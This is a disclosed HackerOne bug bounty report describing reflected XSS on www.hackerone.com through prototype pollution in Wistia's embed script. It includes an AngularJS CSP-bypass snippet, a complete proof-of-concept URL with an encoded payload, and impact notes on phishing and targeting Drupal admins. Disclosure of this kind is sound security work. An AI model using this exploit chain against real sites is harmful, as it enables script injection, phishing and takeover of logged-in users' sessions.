# Reflected XSS on www.hackerone.com via Wistia embed code

## Report Details
- **Report ID**: 986386
- **URL**: https://hackerone.com/reports/986386
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-09-20T02:51:49.138Z
- **Disclosed**: 2020-09-24T20:29:13.087Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**

The HackerOne marketing site uses [Wistia](https://wistia.com/) to host and embed videos using html snippets similar to the following:

```html
<script
  src="https://fast.wistia.com/embed/medias/t306dw04gl.jsonp"
  async=""
></script>
<script src="https://fast.wistia.com/assets/external/E-v1.js" async=""></script>
<div class="wistia_embed wistia_async_t306dw04gl videoFoam=true"></div>
```

The issue is that the `E-v1.js` script is vulnerable to prototype pollution when setting up the logging, via both the url and the document referrer:

```javascript
i._initializers.initWLog = function() {
    var e, t, n, o, a, l, s, d, u, p, c;
    if (t = i.url.parse(location.href),
    document.referrer && (u = i.url.parse(document.referrer)),
```

If the url passed to `i.url.parse` contains a query parameter such as `?__proto__.ggg=1` then it will end up on the Object prototype, for example visiting `https://www.hackerone.com/blog/scaling-security-startup-unicorn?__proto__[ggg]=aaa` and typing `Object.prototype` in the console will show a new property `ggg`.

When initializing the embeds the script creates elements using a method `elem.fromObject`, which takes a hash of properties and turns it into a new element:

```javascript
if (this.chrome = r.elem.fromObject({
    id: r.seqId('wistia_chrome_'),
    class: 'w-chrome',
    style: r.generate.relativeBlockCss(),
    tabindex: -1
})
```

If we use the prototype pollution to add `innerHTML` to Object, then when it is iterating over the hash keys it will find `innerHTML` and set it on the newly created element.

This will create an element with our html, and with a few extra parameters to prevent the script from erroring too early, it will also be added to the dom.

### CSP Bypass

This allows for arbitrary html to be injected, but due to the CSP inline scripts are blocked. The CSP does allow for `*.cloudflare.com` to be used as a script src though, which means that angularJS can be loaded into an iframe with srcdoc and be used to bypass the CSP:

```html
<script src="//code.angularjs.org/1.8.0/angular.js"></script>
<div ng-app>
  <img
    src="/"
    ng-on-error="$event.srcElement.ownerDocument.defaultView.alert($event.srcElement.ownerDocument.domain)"
  />
</div>
```

### Steps To Reproduce

1. Visit `https://www.hackerone.com/blog/scaling-security-startup-unicorn?__proto__.innerHTML=<iframe%20srcdoc%3d"<script%20src%3d%26quot%3bhttps%3a//cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.min.js%26quot%3b></script><body%20ng-app%20ng-csp><img%20src%3d/%20ng-on-error%3d$event.srcElement.ownerDocument.defaultView.parent.document.body.innerHTML%3d$event.srcElement.ownerDocument.defaultView.atob('PHN0eWxlPi5pMXthbmltYXRpb246IHJsIDEuNXMgaW5maW5pdGUgbGluZWFyOyB3aWR0aDogMjgwcHh9Lmkye2FuaW1hdGlvbjogcnIgMS41cyBpbmZpbml0ZSBsaW5lYXI7IHdpZHRoOiAyODBweH1Aa2V5ZnJhbWVzIHJse2Zyb217dHJhbnNmb3JtOiByb3RhdGUoMGRlZyk7fXRve3RyYW5zZm9ybTogcm90YXRlKDM1OWRlZyk7fX1Aa2V5ZnJhbWVzIHJye2Zyb217dHJhbnNmb3JtOiByb3RhdGUoMGRlZyk7fXRve3RyYW5zZm9ybTogcm90YXRlKC0zNTlkZWcpO319PC9zdHlsZT48YSBocmVmPS8vaGFja2Vyb25lLmNvbS9jb3JiM25paz48aW1nIGNsYXNzPWkxIHNyYz0vL2VtYmVkLWZhc3RseS53aXN0aWEuY29tL2RlbGl2ZXJpZXMvYjY3OGIxMTM1ODU4YjZlMzQ3NGEyYjE4ZDU1OGE1ODQ4MTk5MjNlYi5wbmc%2BPC9hPjxhIGhyZWY9Ly9oYWNrZXJvbmUuY29tL3Zha3p6PjxpbWcgY2xhc3M9aTIgc3JjPS8vZW1iZWQtZmFzdGx5Lndpc3RpYS5jb20vZGVsaXZlcmllcy9kYjY5ZjRjMzE5NWYxYTAwNjA1NmM0N2VhZWM5NmQ2YWMyYjM3NTU4LnBuZz48L2E%2BIDxicj5kb2N1bWVudC5kb21haW4gaXM6IA%3D%3D')%2b$event.srcElement.ownerDocument.domain></body>"></iframe>{{7*7}}&__proto__.__global__=1&__proto__.t306dw04gl=1&__proto__.__wistia-t306dw04gl-1_dom_options__=1&__proto__.wistia-t306dw04gl-1=1`

## Impact

* Phishing attacks - if you are logged in to https://hackerone.com/ and you visit https://www.hackerone.com/ then you are redirected to your hacker dashboard. As chrome doesn't show the www so the domains look the same.
* Depending on how Drupal is setup it may be possible to target a logged in admin, eg using the xss to load `/admin/modules/install` and install a malicious plugin

## Attachments
No attachments
